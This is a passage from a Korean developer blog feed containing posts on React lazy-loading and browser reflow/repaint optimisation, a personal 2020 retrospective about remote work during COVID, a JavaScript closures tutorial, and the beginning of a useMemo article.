</pre></td></tr></tbody></table></code></pre></figure> <p>물론, <code class="language-plaintext highlighter-rouge">Intersection Observer API</code>를 사용하여 직접 구현하는 방법도 있습니다.</p> <h3 id="컴포넌트-preloading">컴포넌트 Preloading</h3> <figure class="highlight"><pre><code class="language-javascript" data-lang="javascript"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
</pre></td><td class="code"><pre><span class="k">import</span> <span class="nx">React</span><span class="p">,</span> <span class="p">{</span> <span class="nx">useState</span><span class="p">,</span> <span class="nx">useEffect</span><span class="p">,</span> <span class="nx">Suspense</span><span class="p">,</span> <span class="nx">lazy</span> <span class="p">}</span> <span class="k">from</span> <span class="dl">'</span><span class="s1">react</span><span class="dl">'</span>

<span class="c1">// factory pattern</span>
<span class="kd">function</span> <span class="nf">lazyWithPreload</span><span class="p">(</span><span class="nx">lazyImport</span><span class="p">)</span> <span class="p">{</span>
<span class="kd">const</span> <span class="nx">Component</span> <span class="o">=</span> <span class="nx">React</span><span class="p">.</span><span class="nf">lazy</span><span class="p">(</span><span class="nx">lazyImport</span><span class="p">)</span>
<span class="nx">Component</span><span class="p">.</span><span class="nx">preload</span> <span class="o">=</span> <span class="nx">lazyImport</span>
<span class="k">return</span> <span class="nx">Component</span>
<span class="p">}</span>

<span class="c1">// lazyLoad 대상이 되는 컴포넌트들을 선언</span>
<span class="kd">const</span> <span class="nx">lazyModal</span> <span class="o">=</span> <span class="nf">lazyWithPreload</span><span class="p">(()</span> <span class="o">=&gt;</span> <span class="k">import</span><span class="p">(</span><span class="dl">'</span><span class="s1">./components/ImageModal</span><span class="dl">'</span><span class="p">))</span>

<span class="kd">function</span> <span class="nf">App</span><span class="p">()</span> <span class="p">{</span>
<span class="kd">const</span> <span class="p">[</span><span class="nx">showModal</span><span class="p">,</span> <span class="nx">setShowModal</span><span class="p">]</span> <span class="o">=</span> <span class="nf">useState</span><span class="p">(</span><span class="kc">false</span><span class="p">)</span>

<span class="nf">useEffect</span><span class="p">(()</span> <span class="o">=&gt;</span> <span class="p">{</span>
<span class="nx">lazyModal</span><span class="p">.</span><span class="nf">preload</span><span class="p">()</span>
<span class="c1">// factory pattern을 사용하지 않는다면 아래와 같이 직접 import</span>
<span class="kd">const</span> <span class="nx">imageModal</span> <span class="o">=</span> <span class="k">import</span><span class="p">(</span><span class="dl">'</span><span class="s1">./component/ImageModal</span><span class="dl">'</span><span class="p">)</span>
<span class="p">})</span>

<span class="nf">render </span><span class="p">(</span>

<span class="o">&lt;</span><span class="nx">div</span> <span class="nx">className</span><span class="o">=</span><span class="dl">"</span><span class="s2">App</span><span class="dl">"</span><span class="o">&gt;</span>
<span class="o">&lt;</span><span class="nx">Header</span> <span class="o">/&gt;</span>
<span class="p">...</span>
<span class="o">&lt;</span><span class="nx">Footer</span> <span class="o">/&gt;</span>
<span class="o">&lt;</span><span class="nx">Suspense</span> <span class="nx">fallback</span><span class="o">=</span><span class="p">{</span><span class="o">&lt;</span><span class="nx">div</span><span class="o">&gt;</span><span class="nx">Loading</span><span class="p">...</span><span class="o">&lt;</span><span class="sr">/div&gt;}</span><span class="err">&gt;
</span><span class="p">{</span><span class="nx">showModal</span> <span class="p">?</span> <span class="o">&lt;</span><span class="nx">LazyModal</span> <span class="nx">closeModal</span><span class="o">=</span><span class="p">{()</span> <span class="o">=&gt;</span> <span class="nf">setShowModal</span><span class="p">(</span><span class="kc">false</span><span class="p">)}</span> <span class="sr">/&gt; : ''</span><span class="err">}
</span><span class="o">&lt;</span><span class="sr">/Suspense</span><span class="err">&gt;
</span><span class="o">&lt;</span><span class="sr">/div</span><span class="err">&gt;
</span><span class="p">)</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></pre></figure> <h3 id="repaint-reflow-줄이기"><code class="language-plaintext highlighter-rouge">repaint</code>, <code class="language-plaintext highlighter-rouge">reflow</code> 줄이기</h3> <p>브라우저는 렌더링 과정에서 레이아웃(Reflow)과 페인트(Repaint) 단계를 거칩니다. DOM이나 스타일이 변경되면 이 과정이 다시 발생하는데, 특히 <strong>Reflow</strong>는 전체 레이아웃을 다시 계산해야 하므로 비용이 큽니다.</p> <ul> <li><strong>Reflow 발생 최소화</strong>: 레이아웃에 영향을 주는 속성(<code class="language-plaintext highlighter-rouge">width</code>, <code class="language-plaintext highlighter-rouge">height</code>, <code class="language-plaintext highlighter-rouge">margin</code> 등) 변경을 최소화합니다.</li> <li><strong>Repaint만 발생시키는 속성 사용</strong>: 레이아웃 변경 없이 스타일만 바꾸는 <code class="language-plaintext highlighter-rouge">color</code>, <code class="language-plaintext highlighter-rouge">background-color</code>, <code class="language-plaintext highlighter-rouge">visibility</code> 등을 활용합니다.</li> <li><strong>GPU 가속 활용 (Composite)</strong>: <code class="language-plaintext highlighter-rouge">transform</code>, <code class="language-plaintext highlighter-rouge">opacity</code> 속성을 사용하면 Reflow/Repaint 없이 합성(Composite) 단계만 수행하므로 애니메이션 성능이 크게 향상됩니다.</li> </ul> <figure class="highlight"><pre><code class="language-css" data-lang="css"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre></td><td class="code"><pre><span class="o">//</span> <span class="nt">Reflow</span> <span class="nt">발생</span> <span class="o">(</span><span class="nt">비효율적</span><span class="o">)</span>
<span class="nc">.box</span> <span class="p">{</span>
<span class="nl">left</span><span class="p">:</span> <span class="m">10px</span><span class="p">;</span>
<span class="nl">width</span><span class="p">:</span> <span class="m">100px</span><span class="p">;</span>
<span class="p">}</span>

<span class="o">//</span> <span class="nt">GPU</span> <span class="nt">가속</span> <span class="nt">활용</span> <span class="o">(</span><span class="nt">효율적</span><span class="o">)</span>
<span class="nc">.box</span> <span class="p">{</span>
<span class="nl">transform</span><span class="p">:</span> <span class="nf">translateX</span><span class="p">(</span><span class="m">10px</span><span class="p">);</span>
<span class="nl">opacity</span><span class="p">:</span> <span class="m">0.5</span><span class="p">;</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></pre></figure> <hr/> <p>요약하자면, 웹 성능 최적화를 위해서는 먼저</p> <p>(1) <strong>브라우저 렌더링 과정</strong>을 이해하고</p> <pre><code class="language-typograms">+-------------------+
| Resource Download |
+---------+---------+
          |
          v
+---------+---------+
| HTML &amp; CSS Parse  |
+---------+---------+
          |
          v
+---------+---------+
| Style (RenderTree)|
+---------+---------+
          |
          v
+---------+---------+
|      Layout       |
+---------+---------+
          |
          v
+---------+---------+
|       Paint       |
+---------+---------+
          |
          v
+---------+---------+
|     Composite     |
+-------------------+
</code></pre> <p>(2) 개발자 도구에서 제공하는 여러가지 지표들을 통해 <strong>병목 구간</strong>을 찾아내고</p> <p>(3) 이를 <strong>점진적으로 개선</strong>하는 노력이 필요합니다.</p> <p>개발자 도구 외에도 <a href="https://create-react-app.dev/docs/analyzing-the-bundle-size/">source-map-explorer</a>, <a href="https://www.npmjs.com/package/webpack-bundle-analyzer">webpack-bundle-analyzer</a>, <a href="https://github.com/svengau/cra-bundle-analyzer">cra-bundle-analyzer</a> (CRA에서 <code class="language-plaintext highlighter-rouge">eject</code> 없이 사용할 수 있어 앞의 두 방법에 비해 추천!) 등의 라이브러리를 활용하거나 아래 사이트를 참고하는 방안도 고려해봄직 합니다.</p> <ul> <li><a href="https://www.webpagetest.org/">WEB PAGE TEST</a></li> <li><a href="https://developers.google.com/speed/pagespeed/insights/">PageSpeed Insights</a></li> <li><a href="https://web.dev/measure/">web.dev - Measure</a></li> </ul> <hr/> <p>🔗 참조</p> <p>📌 <a href="https://developers.google.com/web/tools/chrome-devtools/evaluate-performance">Chrome DevTools - Performance</a></p> <p>📌 <a href="https://web.dev/fast">web.dev - Fase load times</a></p> <p>📌 <a href="https://developer.mozilla.org/en-US/docs/Learn/Performance">MDN - Web Performance</a></p> <p>📌 <a href="https://ui.toast.com/fe-guide/ko_PERFORMANCE">TOAST - 성능 최적화</a></p> <p>📌 <a href="https://tv.naver.com/v/4578425">DEVIEW2018 - 웹 성능 최적화에 필요한 브라우저의 모든 것</a></p> <p>📌 <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Caching">MDN : HTTP Caching</a></p>]]></content><author><name></name></author><category term="WebPerformance"/><category term="Optimize"/><category term="DeveloperTools"/><category term="WebVitals"/><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">2020년 하반기 회고</title><link href="https://chanmi-lee.github.io/articles/2020-12/retrospective-of-2020/" rel="alternate" type="text/html" title="2020년 하반기 회고"/><published>2020-12-27T00:00:00+00:00</published><updated>2020-12-27T00:00:00+00:00</updated><id>https://chanmi-lee.github.io/articles/2020-12/retrospective-of-2020</id><content type="html" xml:base="https://chanmi-lee.github.io/articles/2020-12/retrospective-of-2020/"><![CDATA[<h3 id="2020년-하반기-회고">2020년 하반기 회고</h3> <p>상반기 회고를 작성한게 얼마전 같은데, 벌써 12월의 마지막 주말이 되어 지난 하반기와 함께 한 해를 돌아보고자 한다.</p> <h4 id="-covid-그리고-wfh">😷 COVID 그리고 WFH</h4> <p>1월 말, 설 연휴 무렵이었을까. 당시만 하더라도 기관지가 예민하거나 미세먼지에 취약한 편이 아니라면 굳이 <code class="language-plaintext highlighter-rouge">마스크</code>를 쟁여둘만한 이유가 없었던 때였다. 그런데 갑자기 마스크 구매가 폭증하고, 덩달아 가격도 말도 안되게 오르기 시작했다. 회사에서 주문/결제 도메인을 담당하는 팀에 속한 덕분에(?) 다행이게도 조금 빠르게 함께 사는 가족들이 사용할 수 있을 정도의 마스크를 그래도 합리적인 가격에 구매할 수 있었다.</p> <p>충분하지 못한 마스크 공급량이 수요량을 견디지 못해 일시품절되는 경우가 빈번하게 발생했다. 매번 마스크가 풀리는 시간대마다 트래픽이 급증했고, 마스크 5부제라는 나름의 신박한 대안과 충분한 공급량이 뒷받침되기 전까지 동일한 현상이 랜덤하게 발생하였다.</p> <p>회사의 배려와 함께 시작된 <code class="language-plaintext highlighter-rouge">재택근무</code>가 2021년을 며칠 남기지 않은 지금까지, 거의 1년 가까운 기간동안 지속될거란 예상은 전혀 하지 못했다. 메르스나 그 전의 상황처럼 길어봐야 몇 달 정도겠거니- 라고 생각했다. 줌을 통한 팀 미팅과 업무 관련 회의, 올핸즈 미팅, 심지어 온라인 팀회식까지 경험하며 느낀 점은 재택근무가 조금은 먼 미래의 일이라고 생각했으나 나를 포함한 대다수가 예상보다 빠르게 적응하고 있고, 적당히 멀어진 사회적 관계가 좋으면서도 한편으로는 이전의 평범한 일상이 그립기도 했다.</p> <p>2021년을 맞이하는 시점인 지금은 매일같이 확진자수가 천명을 넘고 있어 언제 어디서 걸릴지 모르는 상황인지라, 재택근무 덕분에 적어도 출퇴근길에 마주하게 될 혹시 모를 감염으로부터의 걱정에서 벗어난 것만으로도 참 감사하다.</p> <hr/> <h4 id="언택트를-넘어-온택트">언택트를 넘어 온택트</h4> <p>코로나 영향으로, 거의 대부분의 컨퍼런스와 밋업 등의 모임이 <code class="language-plaintext highlighter-rouge">온라인-라이브</code>로 진행되었다. 2019년 연말 즈음에 참석한 오프라인 행사 이후로는 오프라인으로 진행된 모임을 찾아보기가 힘들 정도로 온라인이 대세였다.</p> <p>if kakao, DEVIEW 2020, 우아한 테크콘서트 등의 굵직한 행사들도 온라인으로 진행되었다. 작년까지만 하더라도 워낙 신청률이 높아 하나라도 당첨되기가 어려워 후기나 뒤늦게 올라오는 영상을 보고 아쉬움을 달랬는데, 코로나 덕분에 누릴 수 있는 몇 안되는 좋은 점들 중 하나가 아닌가 싶다.</p> <p>연말이나 연휴 시즌마다 종종 찾던 공연장이나 영화관은 언택트를 강조하는 분위기 속에 발길을 끊은 지 오래지만, 반대로 <code class="language-plaintext highlighter-rouge">넷플릭스</code>와 <code class="language-plaintext highlighter-rouge">유튜브</code> 컨텐츠 소비가 급증한 올 한 해였다. 참을성있게 다음 회를 기다릴 성격이 아니거나 혹은 정해진 시간마다 무언가를 챙겨보는 타입이 아닌지라, 사실 넷플릭스는 이전에 몇 번이나 구독과 해지를 반복했었다. (반대로 얘기하면 몰아보기를 선호하는 타입이라고 할 수도..)</p> <p>어쩔 수 없이 방구석에서 컨텐츠를 소비할 수 밖에 없는 현실과 현장에서만 느낄 수 있는 감동이 조금 덜한 상황이 조금 아쉽긴 하지만, 그나마 내가 할 수 있는 조금의 노력을 통해 최악의 상황은 막을 수 있었으면 하는 조그만 바람이 있을 뿐이다.</p> <hr/> <h4 id="글또-4기와-5기">글또 4기와 5기</h4> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/posts/2020-with-geultto-480.webp 480w,/assets/img/posts/2020-with-geultto-800.webp 800w,/assets/img/posts/2020-with-geultto-1400.webp 1400w," type="image/webp" sizes="95vw"/> <img src="/assets/img/posts/2020-with-geultto.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p>글또 4기에 이어 5기를 신청했다. 글또 활동을 통해 지난 1년동안 (이 글 포함) 총 12개의 글을 작성할 수 있었다. 회고 혹은 다짐글을 제외하면 얼마 되진 않지만, 기록하는 습관을 기르고자 하는데 2주마다 돌아오는 마감일과 예치금 차감이라는 방법이 효과가 있었다. 하루 하루는 생각보다 더디게 가는 것처럼 느껴질 때가 많지만, 2주는 (특히 글또를 시작한 이후로) 생각보다 엄청 빠르게 돌아오더라.</p> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/posts/2020-analytics-480.webp 480w,/assets/img/posts/2020-analytics-800.webp 800w,/assets/img/posts/2020-analytics-1400.webp 1400w," type="image/webp" sizes="95vw"/> <img src="/assets/img/posts/2020-analytics.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p>올해는 주로 React와 JavaScript와 관련된 내용들을 작성하였다. 공식 문서의 내용과 함께 간단한 예제와 함께 글을 작성하곤 했는데, 가장 높은 조회수를 기록한 글은 <a href="https://dev.to/lydiahallie/javascript-visualized-event-loop-3dif">✨♻️ JavaScript Visualized: Event Loop</a> 를 번역한 글이었다.</p> <ul> <li><a href="https://chanmi-lee.github.io/articles/2020-06/JavaScript-Visualized-Event-Loop">[번역]자바스크립트 이벤트 루프</a></li> </ul> <p>개인적으로 상태에 따른 변화를 알기 쉽게 알 수 있도록 gif 이미지를 통해 시각적으로 설명해줘서, 다소 모호할 수 있는 개념을 이해하는데 큰 도움이 되었다.</p> <p>또한 주기적으로 회고 글을 작성하다보니, 어떤 노력들을 했는지 구체적으로 정리할 수 있고 아쉬운 점들을 다음 분기의 개선점으로 삼을 수 있었다.</p> <p>상반기까지는 재택 환경에 적응하고 동시에 업무에 적응하는데 초점을 맞췄다면, 하반기에는 조금 더 역량을 기르고자 유료 강의와 책을 통해 기술을 습득하고 업무에 적용하고자 노력했다.</p> <p>회사에서 제공하는 복지 중 하나로 매월 2개의 인프런 강의를 수강할 수 있어, JavaScript와 React 뿐만 아니라 Node.js와 TypeScript 관련 강의들을 수강했다. 강의의 내용을 블로그엔 기록하진 못하지만, 덕분에 기존의 업무 환경에 국한되지 않고 개선점을 찾아보거나 조금 더 다양하게 고민할 수 있게끔 시야를 넓혀주는데 도움이 된 것 같다.</p> <hr/> <h4 id="다가오는-2021년에는">다가오는 2021년에는</h4> <p>개인적으로는 코로나로 인해 다양한 취미생활을 빼앗겨 아쉬움이 많이 남는 2020년이었다.</p> <ul> <li>여행</li> </ul> <p>여행을 위해 아끼고 아껴둔 연차를 아직도 다 쓰지 못해 조금 여유로운 연말을 보내게 되었다. 5월의 연휴엔 포르투, 6-7월엔 몽골 고비사막 투어를 계획하였는데.. 계획만 하게 되어 매우 아쉬웠다 (ㅠㅠ) 내년에는 멀리 가진 못하더라도 모두가 건강하고 일상의 소소한 행복을 되찾을 수 있었으면- 하고 바라본다.</p> <ul> <li>운동</li> </ul> <p>요가와 라이딩, 런닝을 비롯한 운동 생활 마저도 코로나의 영향권 아래 조심할 수 밖에 없게 되었다.</p> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/posts/how-covid-makes-me-lazy-480.webp 480w,/assets/img/posts/how-covid-makes-me-lazy-800.webp 800w,/assets/img/posts/how-covid-makes-me-lazy-1400.webp 1400w," type="image/webp" sizes="95vw"/> <img src="/assets/img/posts/how-covid-makes-me-lazy.jpg" class="img-fluid rounded z-depth-1" width="100%" height="auto" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p>개인적으로 애플워치를 사용하고 있는데, 코로나 전인 2019년 가을과 코로나 이후인 2020년 봄의 활동링을 비교해보니 그 차이를 확연하게 느낄 수 있었다. (너무나 정적인 2020년이었다 ㅠㅠ) 덕분에 작년에 비해 다소 무거워진 몸이지만, 홈트라도 해야겠다 싶어 구매한 싸이클도 틈틈이 타고, 요가원에 직접 가는 대신 매주 줌을 통해 진행되는 허니쌤의 요가 수업도 놓치지 말아야지! 운동도 배움도 게을러지지 않는 2021년을 보내야겠다 :)</p> <p>2021년에는 모두가 조금 더 웃을 일 많고 건강하며, 코로나에 빼앗긴 평범한 일상을 회복할 수 있기를 바라본다.</p>]]></content><author><name></name></author><category term="retrospective"/><category term="2020"/><category term="workfromhome"/><category term="covid19"/><summary type="html"><![CDATA[2020년 하반기 회고]]></summary></entry><entry><title type="html">Closure in JavaScript</title><link href="https://chanmi-lee.github.io/articles/2020-11/Closure-in-JavaScript/" rel="alternate" type="text/html" title="Closure in JavaScript"/><published>2020-11-30T00:00:00+00:00</published><updated>2020-11-30T00:00:00+00:00</updated><id>https://chanmi-lee.github.io/articles/2020-11/Closure-in-JavaScript</id><content type="html" xml:base="https://chanmi-lee.github.io/articles/2020-11/Closure-in-JavaScript/"><![CDATA[<h3 id="클로저란">클로저란?</h3> <p><code class="language-plaintext highlighter-rouge">클로저</code>란 함수 내부에 정의된 함수이며, 내부함수가 외부함수의 맥락(context)에 접근할 수 있는 것을 의미합니다.</p> <p>다른 프로그래밍 언어들과 마찬가지로, 자바스크립트는 어휘적 유효범위 (lexical scoping)을 사용합니다. 어휘적 유효범위 (lexical scoping)는 정적 유효범위 (static scoping)으로도 번역되며, 함수가 선언된 시점에서의 유효범위를 의미합니다.</p> <p>개념적으로 모든 자바스크립트 함수는 클로저인데, 자바스크립트에서 함수는 객체이고 함수 자신과 관련된 유효범위 체인을 가지고 있기 때문입니다. 자바스크립트 함수가 호출될 때마다, 해당 호출과 관련된 지역 변수를 보관하는 객체가 생성되며 이 객체는 함수의 유효범위 체인에 추가됩니다. 함수가 반환된다면 반대로 객체와 바인딩된 변수는 유효범위 체인에서 제거됩니다.</p> <p>간단한 예제와 함께 살펴보겠습니다.</p> <h3 id="-클로저-예제">📌 클로저 예제</h3> <figure class="highlight"><pre><code class="language-javascript" data-lang="javascript"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="code"><pre><span class="kd">var</span> <span class="nx">closure</span> <span class="o">=</span> <span class="p">(</span><span class="kd">function</span> <span class="nf">getCounter</span><span class="p">()</span> <span class="p">{</span> <span class="c1">// 함수를 정의하고 바로 호출합니다.</span>
<span class="kd">var</span> <span class="nx">counter</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
<span class="k">return</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span> <span class="k">return</span> <span class="nx">counter</span><span class="o">++</span><span class="p">;</span> <span class="p">};</span>
<span class="p">}());</span>
</pre></td></tr></tbody></table></code></pre></figure> <p>위에서 정의한 <code class="language-plaintext highlighter-rouge">getCounter</code> 함수는 함수를 반환하고, 반환된 함수는 내부에서 선언된 변수 <code class="language-plaintext highlighter-rouge">counter</code>를 참조하고 있습니다. 또한 <code class="language-plaintext highlighter-rouge">getCounter</code> 함수의 반환 결과는 <code class="language-plaintext highlighter-rouge">closure</code> 변수에 할당됩니다.</p> <p><code class="language-plaintext highlighter-rouge">counter</code>와 같은 내부 변수는 여러 클로저가 공유할 수 있습니다. 이는 같은 함수 안에 정의된 중첩 함수들이 같은 유효범위 체인을 공유하기 때문입니다.</p> <p>아래 예제와 함께 조금 더 자세히 살펴보겠습니다.</p> <figure class="highlight"><pre><code class="language-javascript" data-lang="javascript"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre></td><td class="code"><pre><span class="kd">function</span> <span class="nf">counter</span><span class="p">()</span> <span class="p">{</span>
<span class="kd">var</span> <span class="nx">n</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
<span class="k">return</span> <span class="p">{</span>
<span class="na">count</span><span class="p">:</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span> <span class="k">return</span> <span class="nx">n</span><span class="o">++</span><span class="p">;</span> <span class="p">},</span>
<span class="na">reset</span><span class="p">:</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span> <span class="nx">n</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="p">}</span>
<span class="p">};</span>
<span class="p">}</span>

<span class="kd">var</span> <span class="nx">c</span> <span class="o">=</span> <span class="nf">counter</span><span class="p">(),</span> <span class="nx">d</span> <span class="o">=</span> <span class="nf">counter</span><span class="p">();</span> <span class="c1">// 두 개의 카운터를 생성합니다.</span>
<span class="nx">c</span><span class="p">.</span><span class="nf">count</span><span class="p">();</span> <span class="c1">// =&gt; 0</span>
<span class="nx">d</span><span class="p">.</span><span class="nf">count</span><span class="p">();</span> <span class="c1">// =&gt; 0 : c와 d는 서로 독립적입니다.</span>
<span class="nx">c</span><span class="p">.</span><span class="nf">reset</span><span class="p">();</span> <span class="c1">// reset() 메서드와 count() 메서드는 상태를 공유합니다. 즉 같은 유효범위 체인을 공유합니다.</span>
<span class="nx">c</span><span class="p">.</span><span class="nf">count</span><span class="p">();</span> <span class="c1">// =&gt; 0 : c를 reset하였기 때문에 0을 반환합니다.</span>
<span class="nx">d</span><span class="p">.</span><span class="nf">count</span><span class="p">();</span> <span class="c1">// =&gt; 1 : d는 reset되지 않았기 때문에 1을 반환합니다.</span>
</pre></td></tr></tbody></table></code></pre></figure> <p>위의 예제에서 함수 <code class="language-plaintext highlighter-rouge">counter</code>를 호출할 때마다 새로운 유효범위 체인과 새로운 내부 변수가 생성됩니다. 때문에 <code class="language-plaintext highlighter-rouge">counter</code>를 호출하는 서로 다른 객체 c, d를 생성하면 이들은 각각 독립적인 유효범위를 가지며, 예제에서처럼 객체 c의 <code class="language-plaintext highlighter-rouge">count()</code>, <code class="language-plaintext highlighter-rouge">reset()</code>를 호출하는 것은 객체 d에게는 아무런 영향을 주지 않게 됩니다.</p> <blockquote> <p>내부 변수는 외부에서는 직접 접근할 수 없으며, 클로저를 통해서만 사용할 수 있습니다. 이는 객체지향언어의 private 멤버 변수와 같은 역할을 합니다.</p> </blockquote> <p>너무나 유명한 반복문 클로저 예제도 함께 살펴보겠습니다.</p> <figure class="highlight"><pre><code class="language-javascript" data-lang="javascript"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre></td><td class="code"><pre><span class="kd">function</span> <span class="nf">count</span><span class="p">()</span> <span class="p">{</span>
<span class="kd">var</span> <span class="nx">i</span><span class="p">;</span>
<span class="k">for </span><span class="p">(</span><span class="nx">i</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;=</span> <span class="mi">10</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
<span class="nf">setTimeout</span><span class="p">(</span><span class="kd">function</span> <span class="nf">timer</span><span class="p">()</span> <span class="p">{</span>
<span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="nx">i</span><span class="p">);</span>
<span class="p">},</span> <span class="nx">i</span> <span class="err">\</span><span class="o">*</span> <span class="mi">100</span><span class="p">);</span>
<span class="p">}</span>
<span class="p">}</span>
<span class="nf">count</span><span class="p">();</span>
</pre></td></tr></tbody></table></code></pre></figure> <p>0.1초마다 1부터 10까지 출력하고자 하였지만, 실제로 코드를 실행해보면 결과는 10이 10번 출력됩니다.</p> <p><code class="language-plaintext highlighter-rouge">timer</code>는 항상 상위 스코프인 <code class="language-plaintext highlighter-rouge">count</code>에게 내부 변수인 <code class="language-plaintext highlighter-rouge">i</code> 값을 요청하지만, 0.1초 후에 호출됩니다. 그런데 처음 0.1초가 지날 동안 이미 <code class="language-plaintext highlighter-rouge">i</code>값은 10이 되어버리고 이를 계속해서 참조하기 때문에 결국 본래 의도와 달리 10만 10번 출력하게 됩니다.</p> <figure class="highlight"><pre><code class="language-javascript" data-lang="javascript"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre></td><td class="code"><pre><span class="kd">function</span> <span class="nf">count</span><span class="p">()</span> <span class="p">{</span>
<span class="kd">var</span> <span class="nx">i</span><span class="p">;</span>
<span class="k">for </span><span class="p">(</span><span class="nx">i</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;=</span> <span class="mi">10</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
<span class="p">(</span><span class="kd">function</span><span class="p">(</span><span class="nx">innerCounting</span><span class="p">)</span> <span class="p">{</span>
<span class="nf">setTimeout</span><span class="p">(</span><span class="kd">function</span> <span class="nf">timer</span><span class="p">()</span> <span class="p">{</span>
<span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="nx">innerCounting</span><span class="p">);</span>
<span class="p">},</span> <span class="nx">i</span> <span class="err">\</span><span class="o">*</span> <span class="mi">100</span><span class="p">);</span>
<span class="p">})(</span><span class="nx">i</span><span class="p">);</span>
<span class="p">}</span>
<span class="p">}</span>
<span class="nf">count</span><span class="p">();</span>
</pre></td></tr></tbody></table></code></pre></figure> <p>위의 예제와 같이 새로운 스코프를 추가해주면, 독립적인 환경에 값을 따로 저장하게 됩니다.</p> <blockquote> <p>모든 함수는 함수가 생성된 곳의 어휘적 유효범위 (lexical scoping)을 기억합니다. 함수는 [[Environment]]라 불리는 프로퍼티를 갖는데, 여기에 어휘적 유효범위에 대한 참조가 저장됩니다. [[Environment]]는 함수가 생성될 때 값이 세팅되며 이 값은 불변합니다.</p> </blockquote> <p>혹은 아래와 같이 ES6에서 추가된 블록 스코프 방식, 즉 <code class="language-plaintext highlighter-rouge">let</code> 키워드를 이용할 수도 있습니다.</p> <figure class="highlight"><pre><code class="language-javascript" data-lang="javascript"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre></td><td class="code"><pre><span class="kd">function</span> <span class="nf">count</span><span class="p">()</span> <span class="p">{</span>
<span class="dl">'</span><span class="s1">use strict</span><span class="dl">'</span><span class="p">;</span>
<span class="k">for </span><span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;=</span> <span class="mi">10</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
<span class="nf">setTimeout</span><span class="p">(</span><span class="kd">function</span> <span class="nf">timer</span><span class="p">()</span> <span class="p">{</span>
<span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="nx">i</span><span class="p">);</span>
<span class="p">},</span> <span class="nx">i</span> <span class="err">\</span><span class="o">*</span> <span class="mi">100</span><span class="p">);</span>
<span class="p">}</span>
<span class="p">}</span>
<span class="nf">count</span><span class="p">();</span>
</pre></td></tr></tbody></table></code></pre></figure> <hr/> <p>🔗 참조</p> <p>📌 <a href="https://developer.mozilla.org/ko/docs/Web/JavaScript/Guide/Closures">MDN - Closure</a></p> <p>📌 <a href="https://meetup.toast.com/posts/86">TOAST - 자바스크립트의 스코프와 클로저</a></p> <p>📌 <a href="https://opentutorials.org/course/743/6544">생활코딩 - 클로저</a></p>]]></content><author><name></name></author><category term="JavaScript"/><category term="closure"/><summary type="html"><![CDATA[클로저란?]]></summary></entry><entry><title type="html">useMemo in React</title><link href="https://chanmi-lee.github.io/articles/2020-11/useMemo-in-React/" rel="alternate" type="text/html" title="useMemo in React"/><published>2020-11-15T00:00:00+00:00</published><updated>2020-11-15T00:00:00+00:00</updated><id>https://chanmi-lee.github.io/articles/2020-11/useMemo-in-React</id><content type="html" xml:base="https://chanmi-lee.github.io/articles/2020-11/useMemo-in-React/"><![CDATA[<h3 id="usememo란">useMemo란?</h3> <p><code class="language-plaintext highlighter-rouge">useMemo</code> 함수는 React v16.8부터 내장되어 있는 Hooks의 하나입니다. Hook이란 함수형 컴포넌트에서 State, LifeCycle, Reference 등의 클래스형 컴포넌트의 기능을 구현한 개념으로, 이를 통해 memoization 기법을 함수형 컴포넌트에도 쉽게 적용할 수 있습니다.</p> <blockquote> <p><strong>memoization</strong>는 알고리즘 성능 최적화에 자주 쓰이는 개념 중 하나로, 이름 그대로 메모를 하는 것을 의미합니. 프로그래밍에서 반복되는 결과를 메모리에 저장해두고 동일한 연산이 필요한 경우 이를 재활용하는 기법을 의미합니다. 이를 적절히 활용하면 중복을 피하고 애플리케이션의 속도를 향상시킬 수 있다는 이점이 있습니다.</p> </blockquote> <p>React에서 컴포넌트 랜더링은 빈번하게 일어나는데, 대표적인 사례로는 컴포넌트 자신의 상태 변경 혹은 부모 컴포넌트의 상태 변경의 영향으로 함께 